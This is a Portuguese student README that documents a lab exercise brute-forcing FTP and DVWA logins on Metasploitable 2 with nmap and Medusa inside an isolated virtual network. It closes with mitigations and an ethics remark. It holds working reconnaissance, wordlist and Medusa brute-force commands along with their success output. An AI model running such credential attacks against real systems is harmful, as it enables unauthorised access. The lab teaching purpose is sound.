# Cybersecurity Lab: Brute Force & Network Reconnaissance

Repositório destinado à documentação do desafio prático de Pentest, focado em ataques de força bruta utilizando **Kali Linux** e **Medusa** contra o ambiente vulnerável **Metasploitable 2**.

## 1. Arquitetura do Ambiente

O laboratório foi construído visando o isolamento e a performance, utilizando tecnologias de virtualização de baixo nível.

* **Host:** Acer Nitro ANV15-51 (Zorin OS 18).
* **Virtualização:** QEMU/KVM gerenciado via `virt-manager`.
* **Rede:** NAT Virtual Network (Subrede `192.168.122.0/24`).
* **Atacante:** Kali Linux (`192.168.122.7`).
* **Alvo:** Metasploitable 2 (`192.168.122.60`).

## 2. Metodologia

### Reconhecimento (Recon)

A fase inicial consistiu no mapeamento de serviços para identificação de vetores de ataque, de acordo com o que ensinado pela Professora Isadora Ferrão.
A isso precedeu apenas o IP a, para encontrar o IP da máquina do Metasploitable.

```bash
nmap -sV 192.168.122.60

```

O scan revelou serviços críticos expostos, como **FTP (21)**, **SSH (22)** e **HTTP (80/8180)**.

### Preparação de Wordlists

Utilizei automação via shell para criar listas de usuários e senhas baseadas em padrões de credenciais fracas:

```bash
echo -e "user\msfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

```

## 3. Execução dos Ataques

### FTP - Brute Force (Sucesso Real)

O ataque ao protocolo FTP foi executado com sucesso imediato.

* **Comando:** `medusa -h 192.168.122.60 -U users.txt -P pass.txt -M ftp`
* **Resultado:** `ACCOUNT FOUND: [ftp] User: msfadmin Password: msfadmin [SUCCESS]`.

### HTTP/DVWA - Análise de Falso Positivo

Durante a simulação no formulário de login do DVWA, observou-se um comportamento atípico do Medusa v2.3.

* **O Problema:** O módulo HTTP falhou em interpretar os sub-parâmetros `FORM` e `FAIL`, gerando avisos de `Invalid method`. Provavelmente por estar com nível de segurança high.
* **A Consequência:** A ferramenta interpretou toda resposta HTTP 200 (página carregada) como um login bem-sucedido, resultando em múltiplos falsos positivos.
* **Validação Manual:** Através do navegador, confirmou-se que as credenciais reportadas como "sucesso" pelo Medusa eram inválidas, reforçando a importância da verificação humana em auditorias automatizadas.
* **Fix:** Continuarei tentando =D.
  
## 4. Matriz de Risco e Mitigação

| Vetor | Gravidade | Medida de Mitigação |
| --- | --- | --- |
| **FTP/SSH** | Crítica | Implementação de **Fail2Ban** e desativação de login root. |
| **HTTP Auth** | Alta | Implementação de **CAPTCHA** e Rate Limiting no servidor web. |
| **Geral** | Alta | Aplicação de políticas de **MFA** (Multi-Factor Authentication). |

## 5. Conclusão

A prática demonstrou que vulnerabilidades de autenticação são frequentemente causadas por negligência em configurações básicas. Este laboratório reforça que o acesso não autorizado, mesmo em ambientes com senhas fracas, constitui invasão. A segurança deve ser tratada como um processo contínuo de prevenção e monitoramento.

---

### Como usar este repositório:

1. Os comandos detalhados podem ser reproduzidos em ambiente `libvirt`.
2. Consulte a pasta `/wordlists` para os arquivos de dicionário utilizados.
